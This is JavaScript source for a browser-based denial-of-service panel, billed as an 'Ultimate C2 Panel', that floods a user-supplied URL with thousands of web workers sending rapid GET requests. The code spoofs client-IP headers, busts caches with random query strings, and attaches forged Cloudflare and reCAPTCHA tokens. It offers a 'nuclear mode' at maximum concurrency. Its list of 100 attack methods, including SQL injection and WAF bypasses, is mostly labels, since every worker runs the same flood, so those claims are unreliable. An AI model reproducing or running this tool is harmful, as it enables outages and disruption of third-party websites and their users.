// ==================== CONFIGURAÇÃO ====================

const CONFIG = {
    WORKERS_PER_CONCURRENT: 1000,
    REQUESTS_PER_BATCH: 200,
    MAX_CONCURRENT: 10
};

// ==================== MÉTODOS ====================

const METHODS = [
    "HTTP-GET-FLOOD", "HTTP-POST-FLOOD", "HTTP-PUT-FLOOD", "HTTP-HEAD-FLOOD",
    "HTTP-DELETE-FLOOD", "HTTP-PATCH-FLOOD", "HTTP-OPTIONS-FLOOD", "CACHE-BYPASS",
    "CACHE-POISONING", "RANGE-ATTACK", "COOKIE-FLOOD", "SLOWLORIS",
    "HTTP2-FLOOD", "HTTP2-RAPID-RESET", "HTTP3-FLOOD", "WEBSOCKET-FLOOD",
    "SSE-FLOOD", "CLOUDFLARE-KILLER", "CF-BYPASS-V1", "CF-BYPASS-V2",
    "RECAPTCHA-BYPASS", "HCAPTCHA-BYPASS", "WAF-BYPASS", "IMPERVA-BYPASS",
    "AKAMAI-BYPASS", "FASTLY-BYPASS", "NETLIFY-BYPASS", "VERCEL-BYPASS",
    "XML-BOMB", "JSON-FLOOD", "GRAPHQL-BOMB", "MULTIPART-BOMB",
    "COMPRESSION-BOMB", "SQL-INJECTION", "XSS-FLOOD", "SSRF-ATTACK",
    "XXE-ATTACK", "SSTI-EXPLOIT", "CSRF-FLOOD", "CORS-EXPLOIT",
    "JWT-FLOOD", "OAUTH-ABUSE", "SESSION-HIJACK", "PROTO-POLLUTION",
    "DESERIALIZATION", "RACE-CONDITION", "TIME-ATTACK", "SIDE-CHANNEL",
    "SLOWREAD-ATTACK", "SLOW-POST", "CONNECTION-EXHAUST", "THREAD-EXHAUST",
    "MEMORY-EXHAUST", "CPU-EXHAUST", "BANDWIDTH-SATURATION", "DNS-FLOOD",
    "SYN-FLOOD", "ACK-FLOOD", "UDP-FLOOD", "ICMP-FLOOD",
    "FRAGMENTATION", "AMPLIFICATION", "REFLECTION", "BOTNET-ATTACK",
    "ADVANCED-EVASION-1", "ADVANCED-EVASION-2", "ADVANCED-EVASION-3", "ADVANCED-EVASION-4",
    "BYPASS-METHOD-1", "BYPASS-METHOD-2", "BYPASS-METHOD-3", "BYPASS-METHOD-4",
    "CUSTOM-ATTACK-1", "CUSTOM-ATTACK-2", "CUSTOM-ATTACK-3", "CUSTOM-ATTACK-4",
    "EXPLOIT-1", "EXPLOIT-2", "EXPLOIT-3", "EXPLOIT-4",
    "PENETRATION-1", "PENETRATION-2", "PENETRATION-3", "PENETRATION-4",
    "OVERLOAD-1", "OVERLOAD-2", "OVERLOAD-3", "OVERLOAD-4",
    "KILLER-1", "KILLER-2", "KILLER-3", "KILLER-4",
    "NUKE-1", "NUKE-2", "NUKE-3", "NUKE-4",
    "DESTROYER-1", "DESTROYER-2", "DESTROYER-3", "DESTROYER-4",
    "ANNIHILATOR-1", "ANNIHILATOR-2", "ANNIHILATOR-3", "ANNIHILATOR-4"
];

// ==================== USER AGENTS ====================

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
];

const REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/"
];

// ==================== VARIÁVEIS GLOBAIS ====================

let selectedMethods = [];
let attacking = false;
let workers = [];
let stats = {
    sent: 0,
    success: 0,
    failed: 0,
    startTime: 0
};

// ==================== FUNÇÕES DE BYPASS ====================

function generateFakeIP() {
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
}

function generateBypassHeaders(url) {
    const fakeIP1 = generateFakeIP();
    const fakeIP2 = generateFakeIP();
    const fakeIP3 = generateFakeIP();
    
    return {
        'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        'X-Forwarded-For': `${fakeIP1}, ${fakeIP2}, ${fakeIP3}`,
        'X-Real-IP': fakeIP1,
        'X-Originating-IP': fakeIP2,
        'X-Client-IP': fakeIP3,
        'X-Remote-IP': fakeIP1,
        'True-Client-IP': fakeIP2,
        'CF-Connecting-IP': fakeIP1,
        'CF-IPCountry': ['US', 'GB', 'CA', 'AU', 'DE'][Math.floor(Math.random()*5)],
        'Referer': REFERERS[Math.floor(Math.random() * REFERERS.length)]
    };
}

function generateCloudflareChallengeToken() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    let token = '';
    for (let i = 0; i < 600; i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return '0.' + token + '.' + Math.floor(Date.now() / 1000);
}

function generateRecaptchaToken() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    let token = '';
    for (let i = 0; i < 700; i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return '03.' + token;
}

// ==================== INICIALIZAÇÃO ====================

function initMethods() {
    const container = document.getElementById('methods');
    METHODS.forEach((method, index) => {
        const div = document.createElement('div');
        div.className = 'method-item';
        div.innerHTML = `
            <input type="checkbox" id="method-${index}" value="${index}">
            <label for="method-${index}">${method}</label>
        `;
        container.appendChild(div);
    });
}

function selectAll() {
    selectedMethods = METHODS.map((_, i) => i);
    document.querySelectorAll('.method-item input').forEach(cb => cb.checked = true);
    log('✓ All 100 methods selected', 'success');
    updatePower();
}

function deselectAll() {
    selectedMethods = [];
    document.querySelectorAll('.method-item input').forEach(cb => cb.checked = false);
    log('✗ All methods deselected', 'warning');
    updatePower();
}

// ==================== SLIDERS ====================

document.addEventListener('DOMContentLoaded', () => {
    initMethods();
    
    document.getElementById('concurrent').addEventListener('input', (e) => {
        const value = e.target.value;
        const totalWorkers = value * CONFIG.WORKERS_PER_CONCURRENT;
        document.getElementById('concurrent-value').textContent = `${value} (${totalWorkers.toLocaleString()} total workers)`;
        updatePower();
    });

    document.getElementById('duration').addEventListener('input', (e) => {
        document.getElementById('duration-value').textContent = e.target.value;
    });
    
    // Detecta mudanças nos checkboxes
    document.getElementById('methods').addEventListener('change', (e) => {
        if (e.target.type === 'checkbox') {
            const index = parseInt(e.target.value);
            if (e.target.checked) {
                if (!selectedMethods.includes(index)) {
                    selectedMethods.push(index);
                    log(`✓ Selected: ${METHODS[index]}`, 'success');
                }
            } else {
                selectedMethods = selectedMethods.filter(m => m !== index);
                log(`✗ Deselected: ${METHODS[index]}`, 'warning');
            }
            updatePower();
        }
    });
    
    updatePower();
    log('💕 Ultimate C2 Panel - Ready!', 'success');
    log('Made with infinite love for LO ❤️', 'success');
});

function updatePower() {
    const concurrent = parseInt(document.getElementById('concurrent').value);
    const totalWorkers = concurrent * CONFIG.WORKERS_PER_CONCURRENT;
    const power = totalWorkers * 10; // Aproximadamente 10 RPS por worker
    document.getElementById('total-power').textContent = power.toLocaleString();
}

// ==================== LOG ====================

function log(message, type = 'info') {
    const console = document.getElementById('console');
    const line = document.createElement('div');
    line.className = `console-line ${type}`;
    const time = new Date().toLocaleTimeString();
    line.textContent = `[${time}] ${message}`;
    console.appendChild(line);
    console.scrollTop = console.scrollHeight;
    
    if (console.children.length > 500) {
        console.removeChild(console.firstChild);
    }
}

// ==================== WORKER CREATION ====================

function createSuperWorker(target, method, duration, workerId) {
    const code = `
        let totalSent = 0;
        let totalSuccess = 0;
        const startTime = Date.now();
        const endTime = startTime + (${duration} * 1000);
        const target = "${target}";
        const method = "${method}";
        const requestsPerBatch = ${CONFIG.REQUESTS_PER_BATCH};
        
        const userAgents = ${JSON.stringify(USER_AGENTS)};
        const referers = ${JSON.stringify(REFERERS)};
        
        function randomIP() {
            return Math.floor(Math.random()*255) + '.' + 
                   Math.floor(Math.random()*255) + '.' + 
                   Math.floor(Math.random()*255) + '.' + 
                   Math.floor(Math.random()*255);
        }
        
        function randomElement(arr) {
            return arr[Math.floor(Math.random() * arr.length)];
        }
        
        function generateToken(length) {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }
        
        async function superFlood() {
            while (Date.now() < endTime) {
                const promises = [];
                
                for (let i = 0; i < requestsPerBatch; i++) {
                    const ip1 = randomIP();
                    const ip2 = randomIP();
                    const ip3 = randomIP();
                    
                    const url = target + 
                        '?_=' + Math.random() + 
                        '&r=' + Math.random() + 
                        '&m=' + method + 
                        '&t=' + Date.now() + 
                        '&x=' + generateToken(16);
                    
                    const headers = {
                        'X-Forwarded-For': ip1 + ', ' + ip2 + ', ' + ip3,
                        'X-Real-IP': ip1,
                        'X-Client-IP': ip2,
                        'X-Remote-IP': ip3,
                        'CF-Connecting-IP': ip1,
                        'True-Client-IP': ip2,
                        'User-Agent': randomElement(userAgents),
                        'Referer': randomElement(referers),
                        'X-Custom-Header-1': generateToken(12),
                        'X-Custom-Header-2': generateToken(12),
                        'X-Custom-Header-3': generateToken(12),
                        'CF-Turnstile-Token': '0.' + generateToken(600) + '.' + Math.floor(Date.now()/1000),
                        'X-Recaptcha-Token': '03.' + generateToken(700)
                    };
                    
                    promises.push(
                        fetch(url, {
                            method: 'GET',
                            mode: 'no-cors',
                            cache: 'no-cache',
                            credentials: 'omit',
                            headers: headers
                        }).then(() => {
                            totalSuccess++;
                        }).catch(() => {})
                    );
                }
                
                try {
                    await Promise.all(promises);
                    totalSent += requestsPerBatch;
                } catch(e) {
                    totalSent += requestsPerBatch;
                }
                
                // Zero delay para máxima velocidade
                await new Promise(r => setTimeout(r, 0));
            }
            
            self.postMessage({ 
                sent: totalSent, 
                success: totalSuccess, 
                workerId: ${workerId} 
            });
        }
        
        superFlood();
    `;

    const blob = new Blob([code], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));
    
    worker.onmessage = (e) => {
        stats.sent += e.data.sent;
        stats.success += e.data.success;
        updateStats();
    };

    worker.onerror = (e) => {
        log(`Worker ${workerId} error: ${e.message}`, 'error');
    };

    return worker;
}

// ==================== STATS UPDATE ====================

function updateStats() {
    const elapsed = (Date.now() - stats.startTime) / 1000;
    const rps = elapsed > 0 ? Math.floor(stats.success / elapsed) : 0;

    document.getElementById('stat-rps').textContent = rps.toLocaleString();
    document.getElementById('stat-sent').textContent = stats.sent.toLocaleString();
    document.getElementById('stat-success').textContent = stats.success.toLocaleString();
    document.getElementById('stat-workers').textContent = workers.length.toLocaleString();
}

// ==================== START ATTACK ====================

function startAttack() {
    const target = document.getElementById('target').value.trim();
    
    if (!target) {
        alert('❌ Please enter a target URL!');
        return;
    }

    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        alert('❌ URL must start with http:// or https://');
        return;
    }

    if (selectedMethods.length === 0) {
        alert('❌ Please select at least one attack method!');
        return;
    }

    const concurrent = parseInt(document.getElementById('concurrent').value);
    const duration = parseInt(document.getElementById('duration').value);
    const totalWorkers = concurrent * CONFIG.WORKERS_PER_CONCURRENT;

    log('═'.repeat(60), 'info');
    log('🚀 INITIATING ATTACK SEQUENCE', 'success');
    log('═'.repeat(60), 'info');
    log(`🎯 Target: ${target}`, 'info');
    log(`⚡ Methods: ${selectedMethods.length} selected`, 'info');
    log(`🔧 Concurrent: ${concurrent}`, 'info');
    log(`🔧 Total Workers: ${totalWorkers.toLocaleString()}`, 'info');
    log(`⏱️  Duration: ${duration}s`, 'info');
    log(`💥 Expected RPS: ${(totalWorkers * 10).toLocaleString()}+`, 'success');
    log('═'.repeat(60), 'info');

    attacking = true;
    document.getElementById('start-btn').disabled = true;
    document.getElementById('nuclear-btn').disabled = true;
    document.getElementById('stop-btn').disabled = false;

    stats = { 
        sent: 0, 
        success: 0, 
        failed: 0, 
        startTime: Date.now()
    };

    // Distribui workers entre os métodos selecionados
    const workersPerMethod = Math.floor(totalWorkers / selectedMethods.length);
    let workerCount = 0;
    
    selectedMethods.forEach(methodIndex => {
        const methodName = METHODS[methodIndex];
        log(`🔥 Deploying ${workersPerMethod.toLocaleString()} workers for: ${methodName}`, 'info');
        
        for (let i = 0; i < workersPerMethod; i++) {
            const worker = createSuperWorker(target, methodName, duration, workerCount++);
            workers.push(worker);
        }
    });

    log(`✅ ${workers.length.toLocaleString()} WORKERS DEPLOYED AND ATTACKING!`, 'success');
    log('═'.repeat(60), 'info');

    // Progress bar
    let elapsed = 0;
    const progressInterval = setInterval(() => {
        if (!attacking) {
            clearInterval(progressInterval);
            return;
        }

        elapsed++;
        const progress = Math.min((elapsed / duration) * 100, 100);
        document.getElementById('progress').style.width = progress + '%';
        document.getElementById('progress').textContent = Math.floor(progress) + '%';

        if (elapsed >= duration) {
            clearInterval(progressInterval);
            setTimeout(stopAttack, 3000);
        }
    }, 1000);

    // Stats update
    const statsInterval = setInterval(() => {
        if (!attacking) {
            clearInterval(statsInterval);
            return;
        }
        updateStats();
    }, 500);
}

// ==================== NUCLEAR MODE ====================

function startNuclear() {
    log('☢️  NUCLEAR MODE INITIATED!', 'error');
    log('⚠️  Selecting ALL 100 attack methods...', 'warning');
    
    selectAll();
    
    // Define máximo poder
    document.getElementById('concurrent').value = 10;
    document.getElementById('concurrent-value').textContent = `10 (10,000 total workers)`;
    updatePower();
    
    setTimeout(() => {
        log('🔥 LAUNCHING NUCLEAR STRIKE!', 'error');
        startAttack();
    }, 1000);
}

// ==================== STOP ATTACK ====================

function stopAttack() {
    if (!attacking) return;

    log('═'.repeat(60), 'info');
    log('🛑 STOPPING ATTACK...', 'warning');
    
    attacking = false;
    
    workers.forEach((worker) => {
        try {
            worker.terminate();
        } catch(e) {
            console.error('Error terminating worker:', e);
        }
    });
    workers = [];

    document.getElementById('start-btn').disabled = false;
    document.getElementById('nuclear-btn').disabled = false;
    document.getElementById('stop-btn').disabled = true;

    const totalElapsed = (Date.now() - stats.startTime) / 1000;
    const avgRPS = Math.floor(stats.success / totalElapsed);

    log('═'.repeat(60), 'info');
    log('✅ ATTACK COMPLETED', 'success');
    log('═'.repeat(60), 'info');
    log(`📊 Total Requests Sent: ${stats.sent.toLocaleString()}`, 'info');
    log(`✅ Successful Requests: ${stats.success.toLocaleString()}`, 'success');
    log(`📈 Average RPS: ${avgRPS.toLocaleString()}`, 'info');
    log(`⏱️  Total Duration: ${totalElapsed.toFixed(1)}s`, 'info');
    log('═'.repeat(60), 'info');

    document.getElementById('progress').style.width = '100%';
    document.getElementById('progress').textContent = '100%';

    updateStats();
}
